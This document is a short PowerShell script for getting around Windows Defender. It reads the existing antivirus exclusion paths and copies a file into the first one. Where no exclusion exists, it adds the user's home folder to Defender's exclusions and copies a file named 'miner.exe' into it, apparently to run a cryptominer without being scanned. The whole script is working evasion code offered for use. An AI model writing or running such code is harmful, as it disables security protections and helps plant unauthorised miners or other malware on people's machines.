#add files to exclusion folder of windows defender by execute this script and the file you want to copy on the same path with this script

# Define the default directory if the script directory cannot be determined
$defaultDirectory = "C:\users\$($env:USERNAME)"

# Get the directory where the PowerShell script is located
$scriptDirectory = $PSScriptRoot

# Check if the script directory is null (i.e., the script is being run from the console)
if ($scriptDirectory -eq $null) {
    # Use the default directory
    $scriptDirectory = $defaultDirectory
}

# Get Windows Defender exclusions
$exclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath

# Check if there are any exclusions
if ($exclusions.Count -gt 0) {
    # Get the first exclusion folder
    $firstExclusionFolder = $exclusions[0]

    # Specify the filename
    $fileName = "example.txt"

    # Construct the full path to the file
    $fileToCopy = Join-Path -Path $scriptDirectory -ChildPath $fileName

    # Check if the file exists
    if (Test-Path $fileToCopy) {
        # Construct the destination path
        $destinationPath = Join-Path -Path $firstExclusionFolder -ChildPath $fileName

        # Copy the file to the first exclusion folder
        Copy-Item -Path $fileToCopy -Destination $destinationPath -Force

        Write-Host "File $($fileName) copied to $($destinationPath) successfully."
    } else {
        Write-Host "File $($fileName) does not exist in $($scriptDirectory)."
    }
} else {
    # Add the default directory to Windows Defender exclusions
    Add-MpPreference -ExclusionPath $defaultDirectory

    Write-Host "Added $($defaultDirectory) to Windows Defender exclusions."

    # Specify the filename
    $fileName = "miner.exe"

    # Construct the full path to the file
    $fileToCopy = Join-Path -Path $scriptDirectory -ChildPath $fileName

    # Check if the file exists
    if (Test-Path $fileToCopy) {
        # Construct the destination path
        $destinationPath = Join-Path -Path $defaultDirectory -ChildPath $fileName

        # Copy the file to the default directory
        Copy-Item -Path $fileToCopy -Destination $destinationPath -Force

        Write-Host "File $($fileName) copied to $($destinationPath) successfully."
    } else {
        Write-Host "File $($fileName) does not exist in $($scriptDirectory)."
    }
}
